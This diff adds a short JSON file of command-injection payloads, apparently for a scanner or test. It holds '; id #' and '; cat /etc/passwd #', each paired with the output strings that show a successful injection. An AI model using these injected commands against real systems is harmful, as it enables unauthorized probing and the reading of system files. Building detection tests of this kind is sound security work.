@@ -1,0 +1,21 @@
+[
+  {
+    "payload": "; id #",
+    "content": [
+      "uid=",
+      "gid=",
+      "groups="
+    ]
+  },
+  {
+    "payload": "; cat /etc/passwd #",
+    "content": [
+      "root:x",
+      "daemon:",
+      "bin:",
+      "sys:",
+      "sync:",
+      "games:"
+    ]
+  }
+]
